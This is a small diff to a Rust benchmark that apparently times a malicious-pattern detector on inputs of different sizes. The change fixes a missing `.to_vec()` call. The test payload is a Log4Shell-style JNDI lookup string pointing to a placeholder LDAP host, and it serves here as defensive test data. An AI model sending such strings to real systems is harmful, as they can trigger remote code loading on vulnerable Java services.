@@ -197,7 +197,7 @@ fn bench_size_scaling(c: &mut Criterion) {
     // Malicious patterns at different positions
     for size in [1_000, 10_000, 50_000] {
         // Malicious at start
-        let mut payload_start = b"${jndi:ldap://a.b/x}".to_vec;
+        let mut payload_start = b"${jndi:ldap://a.b/x}".to_vec();
         payload_start.extend(vec![b'x'; size]);
 
         // Malicious at end
